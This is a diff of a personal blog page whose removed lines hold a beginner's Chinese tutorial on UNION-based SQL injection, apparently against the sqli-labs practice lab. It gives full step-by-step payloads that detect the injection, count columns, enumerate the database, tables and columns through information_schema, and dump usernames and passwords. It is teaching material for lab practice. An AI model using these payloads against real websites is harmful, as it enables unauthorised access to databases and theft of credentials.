-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">单引号判断‘ 显示数据库错误信息或者页面回显不同(整形,字符串类型判断) <br></code></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">\ (转义符) <br></code></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">-1</span>/+<span class="hljs-number">1</span> 回显下一个或上一个页面(整型判断)<br></code></pre></td></tr></table></figure>
-<p>注：加号‘+’在URL中有特殊含义，因此在需要对其进行URL编码为%2b</p>
-<p>先判断是否存在注入,如果存在(正常和异常页面显示不同则存在注入)是字符型还是整型注入。<br><img  src="https://img-blog.csdnimg.cn/20210205154410931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>这里是显示正常的，添加<code>and1=1</code>以及<code>and1=2</code>(1=2为假）来判断是否为整形注入<br><img  src="https://img-blog.csdnimg.cn/20210205154917253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><img  src="https://img-blog.csdnimg.cn/20210205154933740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>可以看出页面均显示正常因此不是整形注入</p>
-<p>加<code>’</code>以及<code>--+</code>注释说明来判断是否为字符型</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">？id=<span class="hljs-number">1</span>’and1=<span class="hljs-number">1</span>--+ 时<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210205155300845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>显示页面异常</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">？id=<span class="hljs-number">1</span>’and1=<span class="hljs-number">2</span>--+<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210205155449629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>显示页面错误，故可判断为字符注入</p>
-<h1 id="二、判断列数"><a href="#二、判断列数" class="headerlink" title="二、判断列数"></a>二、判断列数</h1><p>order by （用来查询列数）用来对表里的数据进行排序,order  by 1 表示按照第一列进行排序.依次类推.<br><code>？id=1&#39; order by 1</code><br>从1到3：均显示正常<img  src="https://img-blog.csdnimg.cn/20210205160435794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">order by <span class="hljs-number">4</span>--+ 时<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210205160624180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>显示异常，说明没有第4列，只存在前3列</p>
-<h1 id="三-找到显示位"><a href="#三-找到显示位" class="headerlink" title="三.找到显示位"></a>三.找到显示位</h1><p>UNION的作用是将两个select查询结果合并，为了爆出第一位后面的显示位需要隐藏正常结果，比如将<code>？id=1</code>改为<code>？id=-1</code>，使union前面的语句报错，执行后面的，爆出显示位</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">？id=<span class="hljs-number">-1</span>’<span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> --+<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210205162344790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><img  src="https://img-blog.csdnimg.cn/20210205162403821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>可以看出只有当id=-1时才可以爆出笑显示位，显示位：2和3，可以插入查询语句</p>
-<h1 id="四-获取库名"><a href="#四-获取库名" class="headerlink" title="四.获取库名"></a>四.获取库名</h1><p>group_concat()一次性显示： </p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">select <span class="hljs-title">group_concat</span><span class="hljs-params">(SCHEMA_NAME)</span> from information_schema.SCHEMATA</span><br></code></pre></td></tr></table></figure>
-<p>显示当前数据库： databas()</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">？id=<span class="hljs-number">-1&#x27;u</span>nion select <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span> --+<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210205163109214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>得到库名：security</p>
-<h1 id="五-获取表名"><a href="#五-获取表名" class="headerlink" title="五.获取表名"></a>五.获取表名</h1><p>从获取库名的讲解，在这里使用group_concat()函数加一个数据表名table_name,然后指定一个来源得到库中的表名</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210205164455524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>得到表名：emails，referers，uagents，users</p>
-<h1 id="六-获取列名"><a href="#六-获取列名" class="headerlink" title="六.获取列名"></a>六.获取列名</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?id=-1&#x27;union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; --+<br></code></pre></td></tr></table></figure>
-<p>从users中获取<br><img  src="https://img-blog.csdnimg.cn/20210205165516791.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<h1 id="七-获取字段信息"><a href="#七-获取字段信息" class="headerlink" title="七.获取字段信息"></a>七.获取字段信息</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?id=<span class="hljs-number">-1&#x27;</span> <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,group_concat(concat_ws(<span class="hljs-number">0x23</span>,username,password)),<span class="hljs-number">3</span> from users --+<br></code></pre></td></tr></table></figure>
-<p>这里是username,password的信息，3是该表中有三列，from 为从users中获取的<br><img  src="https://img-blog.csdnimg.cn/20210205170105883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><img  src="https://img-blog.csdnimg.cn/20210205170124355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>获取成功了！</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>union注入是最简单方便的,但是要求页面必须有显示位,没有就没法利用，在学习sql注入的道路上我们才刚刚起步，加油吧少年！</p>
-
-      
+<article class="list">
+    <div class="list-time">
+        <a href="/2021/02/05/SQL%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/">
+            2021-02-05
+        </a>
+    </div>
+    <div class="list-title">
+        <a href="/2021/02/05/SQL%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/">
+            SQL注入-联合查询入门
+        </a>
     </div>
 </article>
 
-    </li>
-  
-</ul>
-
-  <section id="nav-wrapper">
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/2/">« prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/">next »</a>
-    </nav>
-  </section>
-
-
-            <footer>
-    <div>© 2021 - Willianhuanbian </div>
-    <div>
-        <span>
-            Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
-        </span>
-        ,
-        <span>
-            Theme - <a target="_blank" rel="noopener" href="https://github.com/nameoverflow/hexo-theme-icalm">Icalm</a>
-        </span>
-    </div>
-</footer>
-
-        </div>
-    </div>
+<div class="list-paginator">
+    <a class="extend prev" rel="prev" href="/page/2/">PREV</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/">NEXT</a>
 </div>
-
-<script src="/js/pager/dist/singlepager.js"></script>
-
-<script>
-var sp = new Pager('data-pager-shell')
-
-</script>
-</body>
+</div>
+    </div>
+    <div id="footer">骑士恨煎蛋，骑士恨孜然</div>
+    <img id="top" src="/images/up-circle.svg" alt="top" />
+    
+  </body>
 </html>
+<!-- 加载主题脚本文件 -->
+
+<script src="/scripts/utone.js"></script>
+
+
+<script type="text/javascript">
+  window.onload = function() {
+    scroll.init()
+    siteSearch.init()
+  }
+</script>
